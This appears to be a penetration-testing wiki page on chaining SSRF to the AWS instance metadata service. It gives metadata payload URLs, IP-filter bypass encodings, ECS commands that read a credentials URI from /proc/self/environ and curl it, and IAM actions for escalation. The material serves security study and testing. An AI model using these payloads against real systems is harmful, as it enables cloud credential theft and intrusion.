---
title: "SSRF: pulling instance credentials through a web app"
description: "Chaining a server-side request forgery to 169.254.169.254 to pull instance role credentials out of a web application."
keywords:
  - SSRF
  - 169.254.169.254
  - instance role
  - web application
  - metadata
---

# SSRF

When a web application running on EC2 can be coerced into making a request to an attacker-chosen URL, point it at the metadata endpoint and the response hands back the instance role's credentials. This is the bridge between a web vulnerability and full cloud credentials, and it is why [SSRF](../../../../web/code/injection/request-forgery/index.md) is treated as a cloud-credential technique.

## The core request

```
# any SSRF sink: image fetcher, webhook, URL preview, PDF renderer
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

On IMDSv2 the app must be coaxed into a `PUT` for the token and into sending the token header; see [IMDSv2](imdsv2.md). Where only a GET is possible, an instance left on [IMDSv1](imdsv1.md) returns credentials directly.

## Bypasses when the literal IP is filtered

```
http://169.254.169.254/      ->  http://[::ffff:169.254.169.254]/
                                  http://2852039166/            (decimal)
                                  http://metadata.google.internal (wrong cloud, but test)
                                  gopher://169.254.169.254/...  (where the fetcher honors gopher)
# DNS rebinding and redirect-based bypasses where the fetcher follows 3xx
# open-redirect chain: SSRF -> an attacker redirector -> 169.254.169.254
```

## ECS and Fargate

Tasks do not use `169.254.169.254`; they expose credentials on a per-task path behind `169.254.170.2`. Read the relative URI from the task's own environment, then fetch it, which an in-task SSRF can reach with a plain GET and no token dance:

```bash
cat /proc/self/environ | tr '\0' '\n' | grep AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

## Exploitation notes

- The web SSRF mechanics (sinks, filters, redirect and DNS-rebinding bypasses) live in [request forgery](../../../../web/code/injection/request-forgery/index.md); this page is only the AWS payload.
- Once the role credentials are exported, the role's own rights may mint more: `sts:AssumeRole`, `iam:CreateAccessKey`, `ecr:GetAuthorizationToken`, `cognito-identity:GetCredentialsForIdentity`, `redshift:GetClusterCredentials`, `sso:GetRoleCredentials`, `lightsail:GetInstanceAccessDetails`, and `rds-db` connect tokens; see [credential brokers](../credential-brokers.md).

## Tools

- **Burp Suite** / custom scripts to drive the SSRF sink.
- **Pacu** once the stolen credentials are exported.

## References

- [HackTricks Cloud: SSRF to IMDS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [AWS: instance metadata service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
